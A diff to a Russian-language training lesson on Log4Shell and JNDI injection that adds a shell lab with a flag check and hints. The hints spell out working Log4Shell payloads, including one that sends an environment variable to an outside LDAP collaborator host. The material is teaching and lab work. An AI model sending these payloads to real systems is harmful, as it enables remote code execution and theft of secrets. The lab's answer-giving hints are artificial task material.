@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 40
 summary: "JNDI-инъекции и Log4Shell: lookup в LDAP/RMI, эксплуатация, детект и обходы — RCE через строку в лог."
+lab:
+  kind: shell
+  title: 'Практика: Log4Shell — подтверждение и эксфильтрация'
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: 'grep -q ''nto{'' found.txt'
+  hints:
+    - 'Payload попадает в лог через query-параметр `q`. Проверь безопасно: `?q=%24%7Bjndi:dns://ua.collab.oast.pro/%7D`.'
+    - 'Приложение в debug-режиме отражает обработанную строку лога — смотри на неё в ответе.'
+    - 'Эксфильтрация: вложенный lookup `${env:FLAG}` подставит значение переменной окружения.'
+    - 'Полный payload: `?q=%24%7Bjndi:ldap://collab.oast.pro/%24%7Benv:FLAG%7D%7D`.'
 ---
 
 ## Вопрос, с которого всё начинается
